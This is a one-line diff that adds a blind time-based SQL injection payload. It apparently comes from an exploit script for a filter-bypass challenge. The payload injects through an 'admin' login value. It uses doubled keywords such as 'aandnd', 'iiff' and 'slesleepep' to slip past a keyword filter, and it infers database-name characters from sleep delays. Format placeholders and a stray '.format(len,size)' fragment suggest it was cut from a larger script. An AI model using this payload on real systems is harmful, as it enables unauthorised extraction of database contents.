@@ -1,0 +1,1 @@
+admin' aandnd iiff(asasciicii(subsubstrstr(database(),{},1))!={},slesleepep(1),1)#.format(len,size)
